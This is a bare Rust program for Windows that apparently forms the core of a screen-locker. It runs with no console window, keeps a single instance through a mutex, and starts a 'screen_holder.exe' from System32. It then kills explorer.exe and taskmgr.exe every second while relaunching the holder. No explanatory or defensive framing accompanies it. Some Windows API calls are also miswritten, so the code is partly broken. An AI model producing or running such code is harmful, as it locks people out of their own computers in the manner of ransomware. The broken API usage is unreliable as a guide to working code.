#![windows_subsystem = "windows"]
use std::process::Command;
use std::thread;
use std::time::Duration;
use winapi::um::winbase::{CreateMutexW, GetLastError, ERROR_ALREADY_EXISTS};

fn main() {
    unsafe {
        let m = CreateMutexW(std::ptr::null_mut(), 1, "GATE_LOCK_MUTEX\0".as_ptr() as *const u16);
        if GetLastError() == ERROR_ALREADY_EXISTS { return; }
    }

    let sys = std::env::var("SYSTEMROOT").unwrap() + "\\System32";
    let screen_path = format!("{}\\screen_holder.exe", sys);

    Command::new(&screen_path).creation_flags(0x00000008).spawn().ok();
    Command::new("taskkill").args(["/f", "/im", "explorer.exe"]).status().ok();

    loop {
        thread::sleep(Duration::from_secs(1));
        Command::new("taskkill").args(["/f", "/im", "explorer.exe"]).status().ok();
        Command::new("taskkill").args(["/f", "/im", "taskmgr.exe"]).status().ok();
        Command::new(&screen_path).spawn().ok();
    }
}
